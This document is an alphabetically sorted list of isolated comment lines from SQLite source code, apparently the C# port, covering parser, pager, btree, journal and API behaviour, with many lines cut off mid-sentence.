 The error code is stored in p.rc and this routine returns SQLITE_ERROR.
 The error code stored in database p.db is overwritten with the return
 The error context into which to write the error 
 The error message from the SQL compiler has already been loaded
 The error message passed back through the 5th parameter is held
 The escape character 
 The escape character string must consist of a single UTF-8 character.
 The estimate is conservative.  It might be larger that what is
 The estimatedCost value is an estimate of the cost of doing the
 The exceptions defined in this paragraph might change in a future
 The expired flag was set on the VDBE before the first call
 The expression is a column. Locate the table the column is being
 The expression is a sub-select. Return the declaration type and
 The expression is the default value for the most recently added column
 The expression list to be coded 
 The expression mask set 
 The expression of the ORDER BY pTerm 
 The expression of the term 
 The expression parse tree 
 The expression that defines the start bound 
 The expression that is the result column name 
 The expression to be analyzed 
 The expression to be analyzed. 
 The expression to be fixed to one database 
 The expression to check authorization on 
 The expression to evaluate 
 The extension is of the form:
 The extra data appended to a page is always initialized to zeros the
 The fields of the result 
 The fifth parameter is an arbitrary pointer.  The implementation of the
 The file I/O implementation can use the object type flags to
 The file change counter is incremented when the database is changed
 The file descriptor for the journal file 
 The file is empty (length 0 bytes) 
 The file-system supports the atomic-write property for
 The final ')' token in the CREATE TABLE 
 The final callback parameter is the [rowid] of the row.
 The first application-defined function with a given name overrides all
 The first argument (the third parameter to [sqlite3_db_config()] is a
 The first argument is a pointer to a structure obtained from
 The first argument may be NULL in which case SQLite will allocate the
 The first argument should pointer to an 8-byte aligned buffer
 The first argument to sqlite3_config() is an integer
 The first argument to the callback is a copy of the third argument
 The first argument to the following calls is a [prepared statement].
 The first argument to the handler is a copy of the void
 The first argument to the sqlite3_bind_
 The first behavior (hard-coded to true) is the case if
 The first byte of the journal file exists and is not 0x00.
 The first byte of the new free block is pPage.aDisk[start]
 The first call is made while compiling the SQL statement. Subsequent
 The first element of the array 
 The first form reports the current local setting for the
 The first form reports the current persistent setting for the
 The first form reports the current setting for the
 The first of the while(...) loops below skips over the record-length
 The first page is always a btree page.  The first 100 bytes of the first
 The first parameter (pDef) is a function implementation.  The
 The first parameter is a [prepared statement].
 The first parameter is a pointer to an output buffer. The second
 The first parameter is the [database connection] to which the SQL
 The first parameter should be a copy of the
 The first parameter to [sqlite3_exec()] must be an valid and open
 The first parameter to the authorizer callback is a copy of the third
 The first pointer (the memory pointer) must be aligned to an 8-byte
 The first thread might call this routine recursively.  Recursive
 The first thread to call this routine runs the initialization to
 The first time a column affinity string for a particular index is
 The first time a column affinity string for a particular table
 The first time the sqlite3_aggregate_context() routine is called for a
 The first time this routine is invoked (either internally or by
 The first to decrement to 0 does actual shutdown
 The first to increment to 1 does actual initialization 
 The first two arguments passed to [sqlite3_backup_init()] are the database
 The first two constants cause sqlite3_mutex_alloc() to create
 The fixer to be initialized 
 The flagPragma() subroutine also generates any necessary code
 The flags argument is used to specify properties that affect the
 The flags argument to xAccess() may be [SQLITE_ACCESS_EXISTS]
 The flags argument to xOpen() includes all bits set in
 The flags argument to xSync may be one of [SQLITE_SYNC_NORMAL] or
 The flags define the format of this btree page.  The leaf flag means that
 The flags parameter contains a combination of the EXPRDUP_XXX flags.
 The flags parameter to sqlite3BtreeCreateTable can be the bitwise OR
 The flags parameter to sqlite3BtreeOpen can be the bitwise or of the
 The flags passed to the VFS layer xOpen() call are those specified
 The flattened query is distinct if either the inner or the
 The following 
 The following 256 byte lookup table is used to support SQLites built-in
 The following Debug.Assert is true in all cases accept when
 The following Debug.Assert statements verify that if this is a sharable
 The following are acceptable forms for the input string:
 The following are allowed values for Vdbe.magic
 The following are the meanings of bits in the Expr.flags field.
 The following are the meanings of bits in the Expr.flags2 field.
 The following are the tables generated in this section:
 The following array holds FuncDef structures for all of the functions
 The following asserts make sure that structures used by the btree are
 The following block contains those class members that are dynamically
 The following block of code checks early to see if a cell extends
 The following block sets the new values of Mem.z and Mem.xDel. It
 The following block stores the meta information that will be returned
 The following block updates the change-counter. Exactly how it
 The following call to PagerSetPagesize() serves to set the value of
 The following code adds nothing to the actual functionality
 The following code executes when a syntax error first occurs.
 The following code executes when the parse fails
 The following code is used for testing and debugging only.  The code
 The following code just has to locate the TK_ALL expressions and expand
 The following constant maps TK_xx codes into corresponding
 The following constant value is used by the SQLITE_BIGENDIAN and
 The following expressions are equivalent:
 The following field is really not part of the current level.  But
 The following formatting characters are allowed:
 The following function deletes the value associated with a
 The following function is experimental and subject to change or
 The following functions are instrumented for malloc() failure
 The following functions:
 The following global variable is incremented every time a cursor
 The following global variable is incremented whenever the
 The following global variable is incremented whenever the library
 The following global variables hold counters used for
 The following identity holds:
 The following interfaces are provided.
 The following is VERY experimental 
 The following is executed when the parser accepts
 The following is just a sanity check to make sure SQLite has
 The following is the implementation of an SQL function that always
 The following loop runs once for each term in a compound-subquery
 The following macro converts a relative address in the p2 field
 The following macros are used to suppress compiler warnings and to
 The following macros redefine the API routines so that they are
 The following macros take advantage this fact to provide a fast encode
 The following object holds the list of automatically loaded
 The following opcode values are never used 
 The following operations are also performed by this function.
 The following parameters determine how many adjacent pages get involved
 The following routine destroys a virtual machine that is created by
 The following routine is called if the stack overflows.
 The following routine is subtituted for constant SQLITE_CORRUPT in
 The following routine only works on pentium-class (or newer) processors.
 The following routines are convenience wrappers around methods
 The following routines are used by user-defined functions to specify
 The following routines are used to access elements of the current row
 The following routines extract information from a Mem or sqlite3_value
 The following routines implement the various date and time functions
 The following set of routines are used to disable the simulated
 The following set of routines walk through the parse tree and assign
 The following singleton contains the global configuration for
 The following structure contains information used by the sqliteFix...
 The following structure contains pointers to all SQLite API routines.
 The following structure describes the FROM clause of a SELECT statement.
 The following structure holds pointers to all of the SQLite API
 The following structure keeps track of state information for the
 The following structure represents a single element of the
 The following symbolic values are used to record which type
 The following table contains information about every rule that
 The following table describes the various storage classes for data:
 The following two functions may be used by scalar SQL functions to
 The following two macros are used within the PAGERTRACE() macros above
 The following value as a destructor means to use //sqlite3DbFree().
 The following value is the maximum cell size assuming a maximum page
 The following values may be passed as the second argument to
 The following variable holds a text description of query plan generated
 The following variable is (normally) set once and never changes
 The following variables are all protected by the STATIC_MASTER
 The foreign key is set for IMMEDIATE processing.  A subsequent call
 The format field code letter 
 The format for the journal header is as follows:
 The format of the file header is as follows:
 The formatting of each case is important.  The makefile for SQLite
 The formula above is for computing the action when the lookahead is
 The fourth parameter to sqlite3_open_v2() is the name of the
 The function calling context 
 The function definition object 
 The function definition to insert 
 The function name 
 The function name. 
 The function returns the number of successful conversions.
 The generated code follows this template:
 The generated code will increase the file format number if necessary.
 The glob pattern 
 The global mutex must be held when accessing nMax.
 The global mutex must be held when this function is called.
 The group by clause 
 The hard limit is the ability of a 32-bit signed integer
 The hard upper limit here is 32676.  Most database people will
 The hash for this key. 
 The hash table into which to insert 
 The hash table might fail to resize if sqlite3_malloc() fails or
 The hashing function.
 The header of a record consists of a sequence variable-length integers.
 The header string that appears at the beginning of every
 The hex() function.  Interpret the argument as a blob.  Return
 The highest recorded value is returned in 
 The i-th cell pointer 
 The i-th column of the index.  -1 for rowid 
 The iCol-th column of the result set 
 The idea is that if the atomic-write optimization is not
 The idea is that this function works like a combination of
 The idxNum and idxPtr values are recorded and passed into the
 The implementation might use one or more of the N buffers to hold 
 The implementation of aggregate SQL functions use this routine to allocate
 The implementation of the latter five subroutines depend on which
 The implementation plan is to implement the two coroutines and seven
 The in-memory image of a disk page has the auxiliary information appended
 The in-memory rollback journal is used to journal transactions for
 The inMultipler variable with try to estimate the number of
 The increment is used to increase the schema cookie so that other
 The index (1-based) of the term out of range 
 The index being used for this loop 
 The index entry must begin with a header size 
 The index for named parameters can be looked up using the
 The index for which to generate a key 
 The index in pWC.a[] of the new WhereTerm is returned on success.
 The index is removed from the database hash tables but
 The index of the database the expression refers to 
 The index of the new entry is returned in pIdx.
 The index to be created 
 The index we are testing 
 The index we will be using 
 The initial database size 
 The input is a range of consecutive registers as follows:
 The input is an array of integers that acts as a program
 The input lists are connected via pRight pointers and are
 The input string A 
 The input string must be zero-terminated.  A new zero-terminator
 The input to [sqlite3_complete()] must be a zero-terminated
 The input to [sqlite3_complete16()] must be a zero-terminated
 The input to this routine is an WhereTerm structure with only the
 The integer ROWID or key for the record to be inserted 
 The integer values to xLock() and xUnlock() are one of
 The interface is the same as sqlite3VdbeExec().  But instead of
 The interface to the LEMON-generated parser
 The interface to the virtual-table mechanism defined above (back up
 The interface to the virtual-table mechanism is currently considered
 The interface used by the implementation of the aforementioned functions
 The internals of this structure are intended to be opaque -- client
 The isCommit flag indicates that there is no need to remember that
 The isDirectMode flag may only be non-zero if the library was compiled
 The isHot parameter indicates that we are trying to rollback a journal
 The isMainJrnl flag is true if this is the main rollback journal and
 The job of this function is to make pPg clean by writing its contents
 The jointype starts out showing the join type between the current table
 The journal file exists and no other connection has a reserved
 The journal file format is as follows:
 The journal file from which to read 
 The journal file into which to write 
 The journal file must be open when this function is called.
 The journal file must be open when this is called. A journal header file
 The journal file must be open when this routine is called. A journal
 The journal file was just successfully synced. Set Pager.needSync
 The journal header size for this pager. This is usually the same
 The julian day number times 86400000 
 The jump is taken if the SQLITE_JUMPIFNULL bit is set.
 The justification for duplicating code is that according to
 The key 
 The key is copied onto the P3 register exactly as
 The key of the new record 
 The key we are searching for 
 The key with fewer fields is usually compares less than the
 The largest page size that can be written atomically.
 The last field of the index should be an integer - the ROWID.
 The last prior entry 
 The last root page is recorded in meta[3] and the value of
 The last token parsed 
 The least significant 12 bits is reserved as a mask for WO_ values above.
 The left most table is the first entry in Select.pSrc.  The right-most
 The left operand 
 The left part of the FROM clause already seen 
 The left-most leaf is the one with the smallest key - the first
 The leftmost SQL parameter has an index of 1.  When the same named
 The length of data write will be between 1 and 9 bytes.  The number
 The length of the serialized data for the column 
 The life of a statement object goes something like this:
 The list is being searched and this trunk page is the page
 The list is kept in ascending order by pBt address.
 The list of all registered VFS implementations.
 The list of expressions 
 The location to move pDbPage to 
 The longest decimal representation of a 32 bit integer is 10 digits:
 The look-ahead token 
 The lookup strategy 
 The loop is finished.
 The loop is required here in case the sector-size is larger than the
 The lowest cost plan wins.  The cost is an estimate of the amount of
 The macro MEMDB is true if we are dealing with an in-memory database.
 The macro unlikely() is a hint that surrounds a boolean
 The magic Explain opcode are only inserted when explain==2 (which
 The main btree structure 
 The main database structure 
 The main db file 
 The main parser program.
 The main static mutex 
 The major token code number 
 The major token to shift in 
 The major token value.  This is the code
 The major type of the error token 
 The makefile makes some minor changes to this file (such as inserting
 The mallocFailed flag of the database connection is set if a
 The mapping from character to affinity is given by the SQLITE_AFF_
 The master database table has a structure like this
 The master journal page checksum is the sum of the bytes in the master
 The master-journal page number must never be used as a pointer map page 
 The matching pSrcList item 
 The max embedded payload fraction is the amount of the total usable
 The maximum allowed sector size. 64KiB. If the xSectorsize() method 
 The maximum depth of an expression tree. This is limited to
 The maximum embedded fraction must be exactly 25%.  And the minimum
 The maximum legal page number is (2
 The maximum length of a TEXT or BLOB in bytes.   This also
 The maximum length of a single SQL statement in bytes.
 The maximum number of arguments to an SQL function.
 The maximum number of attached databases.  This must be between 0
 The maximum number of cache pages is set to the absolute
 The maximum number of cells on a single page of the database.  This
 The maximum number of in-memory pages to use for the main database
 The maximum number of opcodes in a VDBE program.
 The maximum number of terms in a compound SELECT statement.
 The maximum page number is 2
 The maximum supported page-size is 32768 bytes. This means that
 The maximum value of a 
 The meanings of the various counters are as follows:
 The memcpy() statement assumes that the wildcard characters are
 The memory for objects of this type is always allocated by 
 The memory locations 
 The memory management strategy depends on the value of the xDel
 The memory pointed to by the character pointers returned for the
 The memory returned by sqlite3_malloc() and sqlite3_realloc()
 The min leaf payload fraction is like the min embedded payload fraction
 The minimum size of any cell is 4 bytes. 
 The minimum value of NN is 1 (of course).  Increasing NN above 1
 The minor type of the error token 
 The module for this virtual table 
 The module name is registered on the [database connection] specified
 The most recently coded instruction was an OP_Column to retrieve the
 The mutex implementation does not need to make a distinction
 The mutex module within SQLite defines [sqlite3_mutex] to be an
 The mutex object
 The mutex subsystem must take care of serializing its own
 The mutex type 
 The nExtra parameter specifies the number of bytes of space allocated
 The nTableLock and aTableLock variables are only used if the shared-cache
 The name context of the SELECT statement 
 The name context used to resolve the name 
 The name of the database or table or column can be returned as
 The name of the new collation sequence is specified as a UTF-8 string
 The name of the new table 
 The name of the schema table.
 The name of the table/view the trigger applies to 
 The name of the trigger 
 The name of the trigger                        
 The name-context to resolve expressions in 
 The names of the following types declared in vdbeInt.h are required
 The names returned are the original un-aliased names of the
 The new WhereTerm object is constructed from Expr p and with wtFlags.
 The new column 
 The new entry 
 The new hash table 
 The new key 
 The new opcode 
 The new record 
 The new rowid 
 The new state to shift in 
 The new table name. 
 The new table record is initialized and put in pParse.pNewTable.
 The new trigger 
 The new virtual table 
 The next action 
 The next block of code implements the VFS methods.
 The next global variable is incremented each type the OP_Sort opcode
 The next global variable records the size of the largest MEM_Blob
 The next group of routines are convenience wrappers around the
 The next group of routines implement the I/O methods specified
 The next index associated with the same table 
 The next instruction executed will be
 The next iteration of the do-loop balances the parent page. 
 The next page to be freed 
 The next routine used only within Debug.Assert() statements 
 The next rowid or record number (different terms for the same
 The next state 
 The next table maps tokens into fallback tokens.  If a construct
 The next thing included is series of defines which control
 The next use of the Rowid or Column or Next instruction for P1
 The node at the root of the subtree is modified as follows:
 The number of == or IN constraints to code 
 The number of cells to add to this page 
 The number of different kinds of things that can be limited
 The number of rowset entries per allocation chunk.
 The number of shared btrees will always be small (usually 0 or 1)
 The number of siblings of the page might be increased or decreased by
 The number of tables in the FROM clause is limited by the number of
 The number of terms in a join is limited by the number of bits
 The object returned by [sqlite3_column_value()] is an
 The object to be destroyed 
 The official C-language API documentation for SQLite is derived
 The old rowid 
 The old rowid shown as entry (1) above is omitted unless both isUpdate
 The one-pDebug.Ass algorithm only works if the WHERE clause constraints
 The only argument is a pointer to a function which works like
 The only choice for this value is [SQLITE_DBCONFIG_LOOKASIDE].
 The only difference is that the public sqlite3_XXX functions enumerated
 The only modifications are the addition of a couple of NEVER()
 The only possible error from InitPage 
 The only reason to read this page is to obtain the page
 The only thing it does is allocate the pLevel.iMem memory cell.
 The only thing that remains to commit the transaction is to finalize
 The opcode being coded 
 The opcodes 1 through 4 perform set and clear operations are performed
 The operand 
 The operand token for setting the span 
 The operator 
 The optimization is also always enabled for temporary files. It is
 The optimizer code in where.c (the thing that decides which
 The optimizer is able to deliver rows in group by order so
 The order by clause 
 The orderByConsumed means that output from [xFilter]/[xNext] will occur in
 The original API set ends here.  All extensions can call any
 The original WHERE clause in pExpr is unaltered.  All this routine
 The original expression 
 The original page number 
 The other allowed parameters to sqlite3_mutex_alloc() each return
 The outer query has 3 slots in its FROM clause.  One slot of the
 The output 
 The output cell may already have a buffer allocated. Move
 The output of the mkkeywordhash.c program is written into a file
 The overlying software layer calls this routine when all of the data
 The p2 value always comes from a prior OP_CreateTable opcode and
 The p4 type for pKeyInfo 
 The pArg argument is passed through to the callback.
 The pBt pointer itself may not be changed while there exists cursors
 The pExpr parameter describes the expression that contains the IN
 The pExpr should be a TK_COLUMN expression.  The table referred to
 The pH to be searched 
 The pIdxInfo field is used to help pick the best index on a
 The pList parameter holds EXPRLIST in the first form of the INSERT
 The pMem structure is assumed to be uninitialized.  Any prior content
 The pNC.nDepth==0 test causes aggregate functions in subqueries
 The pNext field is the only field in the sqlite3_vfs
 The pParent field points back to the parent page.  This allows us to
 The pSchema field may be set once under BtShared.mutex and
 The pSpace buffer is used to store a temporary copy of the divider
 The pSpace buffer will be freed after the next call to
 The pTab member points to the table that triggers are being coded on. The
 The packing computed by the previous block is biased toward the siblings
 The page begins at offset 
 The page being overwritten. 
 The page cache 
 The page cache as a whole is always in one of the following
 The page cache comes up in PAGER_UNLOCK.  The first time a
 The page data 
 The page headers looks like this:
 The page number for this page 
 The page number of a page in journal 
 The page number of the next overflow page in the linked list is
 The page size 
 The page size must be a power of 2 between 512 and 65536.  If the page
 The page that contains a pointer to pDbPage 
 The page that contains the cell 
 The page that pCur currently points to has just been modified in
 The page to be assemblied 
 The page to move to. 
 The pageDestructor() routine handles that chore.
 The pager being played back 
 The pager cache has created a new page. Its content needs to 
 The pager filename is invariant as long as the pager is
 The pager invokes the busy-handler if sqlite3OsLock() returns
 The pager is used to access a database disk file.  It implements
 The pager journal filename is invariant as long as the pager is
 The pager must hold at least a RESERVED lock when this function
 The pager object 
 The pager open on the database file 
 The pager to which this page belongs 
 The parent or outer SELECT statement 
 The parse context of the CREATE TRIGGER statement 
 The parser 
 The parser action. 
 The parser calls this routine after the CREATE VIRTUAL TABLE statement
 The parser calls this routine for each token after the first token
 The parser calls this routine in order to create a new VIEW
 The parser calls this routine once for each column declaration
 The parser calls this routine when it finds a SELECT statement in
 The parser calls this routine when it first sees a CREATE VIRTUAL TABLE
 The parser calls this routine when it sees an INSERT inside the
 The parser calls this routine when it sees the first token
 The parser context 
 The parser to be deleted 
 The parser to be shifted 
 The parser's stack 
 The parsing (and code generating) context 
 The parsing context 
 The parsing context.  Error messages written here 
 The parsing context.  Errors accumulate here 
 The pattern string B 
 The performance of this function is not critical. It is only used by
 The point is to increment the last character before the first
 The point of this discussion is as follows:  When creating a new
 The pointer arguments to [sqlite3_free()] and [sqlite3_realloc()]
 The pointer is always the first 4 bytes of the page in this case.  
 The pointer map data 
 The pointer map is a lookup table that identifies the parent page for
 The pointer map page 
 The pointer map page number 
 The pointer returned by this routine looks directly into the cached
 The pointer returned is ephemeral.  The key/data may move
 The pointers are kept in sorted order by pBtree->pBt.  That
 The pointers returned are valid until a type conversion occurs as
 The pragma's schema_version and user_version are used to set or get
 The precision is ignored on %q and %Q 
 The prepared stmt under constructions 
 The presence of a busy handler does not guarantee that it will be invoked
 The principle used to locate the table name in the CREATE TABLE
 The principle used to locate the table name in the CREATE TRIGGER
 The printf() built into some versions of windows does not understand %lld
 The program counter 
 The progress callback 
 The progress handler must not do anything that will modify
 The pseudo-routine sqlite3ExprSetIrreducible sets the EP2_Irreducible
 The ptrmapCheckPages() contains Debug.Assert() statements that verify that
 The public interface to sqlite3Realloc.  Make sure that the memory
 The purpose of the following Debug.Assert() is to check that only a
 The purpose of the pointer map is to facility moving pages from one
 The purpose of this superclass is to define certain fields that are
 The query generator uses an array of instances of this structure to
 The race condition here is harmless.  If two threads call this
 The random check-hash initialiser 
 The reason for suppressing the TK_AS term when the expression is a simple
 The record created does not contain anything yet.  It will be replaced
 The record flows over onto one or more overflow pages. In
 The record is stored in a B-Tree 
 The record is the sole entry of a pseudo-table 
 The record number is not previously used as a key in the database
 The record-size field is a 2 byte varint and the record
 The reference count of the VTable structure associated with database 
 The regRowid parameter is the index of the register containing (2).
 The register P3 contains the maximum number of allowed errors.
 The registers P1 through P1
 The registers accessed by the OP_IsUnique opcode were allocated
 The registration remains valid until it is replaced by a different
 The remainder of this file contains the declarations of the functions
 The remaining entries all point to query results.  NULL values result
 The replace() function.  Three arguments are all strings: call
 The replacement string C 
 The response to an error depends upon whether or not the
 The rest of this function will use data from the copies rather
 The result is a single row of the sqlite_stat1 table.  The first
 The result is always UTF-8.
 The result is always an integer.
 The result of random()%5 in the GROUP BY clause is probably different
 The result set must have exactly one column 
 The result set of the SELECT 
 The result set of the SELECT statement 
 The result set of the outer query 
 The result that is written to 
 The results are distributed in various ways depending on the
 The results are stored in a sequence of registers
 The results need not be exact.  This is only used for estimating
 The results of a select can be distributed in several ways.  The
 The results of the total query are to be written into a destination
 The return address register 
 The return code 
 The return value from the callback should be one of the WRC_
 The return value from this routine is WRC_Abort to abandon the tree walk
 The return value indicates whether or not fixation is required.  TRUE
 The return value is -1 if no dequoting occurs or the length of the
 The return value is ALWAYS(X).
 The return value is a pointer to an opaque structure that contains
 The return value is either the collation sequence to be used in database
 The return value is stored here 
 The return value of getLastErrorMsg
 The return values is always one of:
 The returned indicate the current (possibly updated) journal-mode.
 The returned string is always UTF-8 encoded. {END}
 The returned string is valid until the [prepared statement] is destroyed
 The returned string pointer is valid until either the [prepared statement]
 The returned structure should be closed by a call to
 The returned value is either PAGER_LOCKINGMODE_NORMAL or
 The returned value is normally a copy of the second argument to this
 The returns an expression that will code to extract the value from
 The right operand 
 The right pointer of the child page pOld becomes the left
 The right-hand side of the AS subexpression 
 The right-most entry is the one with the largest key - the last
 The right-most of SELECTs to be coded 
 The rollback callback is not invoked if a transaction is
 The rollback hook is invoked on a rollback that results from a commit
 The rollback journal is composed of a linked list of these structures.
 The rollback may have destroyed the pPage1.aData value.  So
 The root page number of the new table is left in reg pParse->regRoot.
 The root page numbers of all tables in the database are integer
 The root page of the b-tree is overfull. In this case call the
 The root page of the b-tree now contains no cells. The only sibling
 The root page of the table to be locked 
 The root page of this tree 
 The root program.  All variations call this core.
 The root-page of the master database table.
 The row containing the glob 
 The row that the VUpdate opcode will delete: none 
 The row-record has been opened successfully. Check that the
 The rowid and root page number values are needed by the code that
 The rowid for the new entry is left in register pParse->regRowid.
 The rowid that might be changing 
 The rowid we are to seek to 
 The run-time test procedure might look something like this:
 The safest and easiest to remember policy is to invoke these routines
 The same VFS can be registered multiple times without injury.
 The same locking strategy and
 The sanity checking information for the new journal format consists
 The savepoint to release or rollback need not be the most recently
 The savepoint to rollback or release is identified by parameter
 The schema cookie is used to determine when the schema for the
 The schema has been loaded 
 The schema layer numbers meta values differently.  At the schema
 The schema of the expression 
 The schema-cookie is usually only manipulated internally by SQLite. It
 The second Debug.Assert below verifies that the child page is defragmented
 The second algorithm is to select a rowid at random and see if
 The second argment is the associated aggregate-info object. This
 The second argument is a pointer to the function to invoke when a
 The second argument is the index of the SQL parameter to be set.
 The second argument is the major token number.  The third is
 The second choice is a Mac OS X style fullsync.  The [SQLITE_SYNC_DATAONLY]
 The second column to be indexed (c1) has an index of 0 in
 The second form of this pragma is a no-op if the main database file
 The second parameter is the name of the SQL function to be created or
 The second parameter to sqlite3BtreeGetMeta or sqlite3BtreeUpdateMeta
 The second term in the following conditional enforces the second
 The select statement passed as the first argument is an aggregate query.
 The sequence number on the cursor is incremented after this
 The serial type of the final rowid will always be a single byte.
 The set of static mutexes may change from one SQLite release to the
 The setStrOrError() funtion calls sqlite3VdbeMemSetStr() to store the
 The shared cache setting effects only future calls to
 The shared-lock has just been acquired on the database file
 The sign in front of the number 
 The simple case - no more than one database file (not counting the
 The size of a lookaside slot needs to be larger than a pointer
 The size of file pTo may be reduced by this operation. If anything
 The size of the BLOB (and hence the maximum value of N
 The size of the bitmap is fixed when the object is created.
 The size of the blob (and hence the maximum value of N
 The size of the of each page record in the journal is given by
 The size of the structure can be found by masking the return value
 The slot remains on the free-list. Reduce its size to account
 The solution is the BtShared.pHasContent bitvec. Whenever a page is
 The solution is to add an in-memory page to the cache containing
 The solution is to write the current data for page X into the
 The source [database connection] may be used by the application for other
 The span to be added 
 The special operator TK_ROW means use the rowid for the first
 The specific ORDER BY term 
 The specific table containing the indexed database 
 The sqlite.busyHandler member of the sqlite struct contains the busy
 The sqlite.csChange keeps track of the number of current changes (since
 The sqlite.lastRowid records the last insert rowid generated by an
 The sqlite.lsChange represents the number of changes made by the last
 The sqlite.nChange does not count changes within triggers and keeps no
 The sqlite3KeywordCode function looks up an identifier to determine if
 The sqlite3PagerGet() call may cause the journal to sync. So make
 The sqlite3ResolveExprNames() routines looks for column names and
 The sqlite3ResultSetOfSelect() is only used n contexts where lookaside
 The sqlite3TempInMemory() function is used to determine which.
 The sqlite3_aggregate_count() function is deprecated.  But just to make
 The sqlite3_backup object records state information about an ongoing
 The sqlite3_bind_
 The sqlite3_bind_zeroblob() routine binds a BLOB of length N that
 The sqlite3_column_bytes16() routine is similar to sqlite3_column_bytes()
 The sqlite3_column_type() routine returns the
 The sqlite3_commit_hook() interface registers a callback
 The sqlite3_config() interface is not threadsafe.  The application
 The sqlite3_config() interface is used to make global configuration
 The sqlite3_context_db_handle() interface returns a copy of
 The sqlite3_create_collation_v2() works like sqlite3_create_collation()
 The sqlite3_db_config() interface is used to make configuration
 The sqlite3_db_handle interface returns the [database connection] handle
 The sqlite3_errcode() interface returns the numeric [result code] or
 The sqlite3_errmsg() and sqlite3_errmsg16() return English-language
 The sqlite3_exec() interface is a convenient way of running one or more
 The sqlite3_exec() interface is implemented in terms of
 The sqlite3_exec() routine does nothing to the database that cannot be done
 The sqlite3_extended_result_codes() routine enables or disables the
 The sqlite3_finalize() function is called to delete a [prepared statement].
 The sqlite3_get_autocommit() interface returns non-zero or
 The sqlite3_get_auxdata() interface returns a pointer to the metadata
 The sqlite3_get_table() function evaluates one or more
 The sqlite3_get_table() interface is implemented as a wrapper around
 The sqlite3_index_info structure and its substructures is used to
 The sqlite3_initialize() routine initializes the
 The sqlite3_initialize() routine is called internally by many other
 The sqlite3_initialize() routine returns [SQLITE_OK] on success.
 The sqlite3_int64 and sqlite3_uint64 are the preferred type definitions.
 The sqlite3_interrupt(D) call is in effect until all currently running
 The sqlite3_libversion() function returns the same information as is
 The sqlite3_malloc() routine returns a pointer to a block
 The sqlite3_mprintf() and sqlite3_vmprintf() routines write their
 The sqlite3_mutex_alloc() routine allocates a new
 The sqlite3_mutex_enter() and sqlite3_mutex_try() routines attempt
 The sqlite3_mutex_held() and sqlite3_mutex_notheld() routine are
 The sqlite3_mutex_held() and sqlite3_mutex_notheld() routines
 The sqlite3_mutex_leave() routine exits a mutex that was
 The sqlite3_mutex_leave() routine exits a mutex that was previously
 The sqlite3_open_v2() interface works like sqlite3_open()
 The sqlite3_os_init() routine does operating-system specific
 The sqlite3_pcache type is opaque.  It is implemented by
 The sqlite3_prepare_v2() and sqlite3_prepare16_v2() interfaces are
 The sqlite3_realloc() interface attempts to resize a
 The sqlite3_release_memory() interface attempts to free N bytes
 The sqlite3_reset() function is called to reset a [prepared statement]
 The sqlite3_result_blob() interface sets the result from
 The sqlite3_result_double() interface sets the result from
 The sqlite3_result_error() and sqlite3_result_error16()
 The sqlite3_result_error() and sqlite3_result_error16() functions
 The sqlite3_result_error_code() function changes the error code
 The sqlite3_result_int() interface sets the return value
 The sqlite3_result_int64() interface sets the return value
 The sqlite3_result_nomem() interface causes SQLite to throw an error
 The sqlite3_result_null() interface sets the return value
 The sqlite3_result_toobig() interface causes SQLite to throw an error
 The sqlite3_result_value() interface sets the result of
 The sqlite3_result_zeroblob() interfaces set the result of
 The sqlite3_rollback_hook() interface registers a callback
 The sqlite3_set_auxdata() interface saves the metadata
 The sqlite3_sleep() function causes the current thread to suspend execution
 The sqlite3_test_control() interface calls these routines to
 The sqlite3_test_control() interface is used to read out internal
 The sqlite3_update_hook() interface registers a callback function
 The sqlite3_user_data() interface returns a copy of
 The sqlite3_value object returned by
 The sqlite3_value objects that are passed as parameters into the
 The sqlite3_value_numeric_type() interface attempts to apply
 The sqlite3_value_text16() interface extracts a UTF-16 string
 The sqlite3_vfs_find() interface returns a pointer to a VFS given its name.
 The sqliteInt.h header 
 The sqlite_int64 and sqlite_uint64 types are supported for backwards
 The sqlite_sequence table used by AUTOINCREMENT 
 The sqlite_stat1 table already exists.  Delete all rows. 
 The sqlite_stat1 table exists.  Delete all entries associated with
 The sqlite_stat1 tables does not exist.  Create it.
 The start of the journal file currently contains a single journal
 The state of the parser is completely contained in an instance of
 The state-number 
 The statement is begun on the database file with index P1.  The main
 The statement to bind against 
 The statement transaction is never a top-level transaction.  Hence
 The statements are evaluated one by one until either an error or
 The strategy is that we create an ephemerial table that contains
 The string collected so far 
 The string is not copied - the pointer is stored.  The
 The string to compare against the glob 
 The string value P4 of length P1 (bytes) is stored in register P2.
 The string zNum represents an unsigned integer.  The zNum string
 The string z[] is an ascii representation of a real number.
 The strings are already in the correct encoding.  Call the
 The strings returned by these two routines should be
 The structure is divided into two parts.  When the parser and code
 The subexpression broken out 
 The subquery 
 The subquery is p.pSrc.a[iFrom].  isAgg is true if the outer query
 The subquery uses a single slot of the FROM clause of the outer
 The synopsis of the meanings of the various limits is shown below.
 The sz argument should be the size of the largest database page
 The sz parameter is the number of bytes in each lookaside slot.
 The szOsFile field is the size of the subclassed [sqlite3_file]
 The t2.z='ok' is disabled in the in (2) because it originates
 The table above makes reference to standard C library functions atoi()
 The table associated with FROM clause term pSrc may be either a
 The table being clear is in the main database file if P2==0.  If
 The table being constructed 
 The table being destroyed is in the main database file if P3==0.  If
 The table being dropped does not have the largest root-page
 The table being read 
 The table conceptually has a number of rows and columns.  But
 The table containing the blob 
 The table does not exist. 
 The table from which records will be deleted 
 The table from which rows are deleted 
 The table from which we should delete things 
 The table in the FROM clause of SELECT 
 The table in which we should change things 
 The table key 
 The table object reference passed as the second argument to this function
 The table or view name to create is passed to this routine via tokens
 The table or view or trigger name is passed to this routine via tokens
 The table or view to which the trigger applies 
 The table structure that other action routines have been building
 The table that contains the REFERENCES clause 
 The table that is indexed 
 The table the contains the triggers 
 The table to be locked has root page iTab and is found in database iDb.
 The table to be opened 
 The table to be updated 
 The table to code triggers from 
 The table to insert into.  aka TABLE 
 The table to rename. 
 The table we are inserting into 
 The table we are writing to 
 The target name 
 The temp.database schema is allocated differently from the other schema
 The temporary database we vacuum into 
 The term being analyzed must have two or more of OR-connected subterms.
 The term of the WHERE clause to be coded 
 The term to be analyzed 
 The terms of a FROM clause are contained in the Select.pSrc structure.
 The testcase() macro is used to aid in coverage testing.  When
 The text encoding used by this database 
 The third and fourth arguments to the auth function are the name of
 The third and fourth arguments to the callback contain pointers to the
 The third and fourth parameters to this function are the table and column
 The third argument is the value to bind to the parameter.
 The third parameter 
 The third parameter (nArg)
 The third term of the test was added to fix ticket 
 The three remaining templates assume the statement is of the form
 The token 
 The token that holds the name of the view 
 The tokenizer always gives us a token 
 The top of the loop 
 The top of the loop looks like this:
 The top of the parser's stack 
 The transaction journal now exists and we have a RESERVED or an
 The transition to PAGER_EXCLUSIVE occurs before any changes
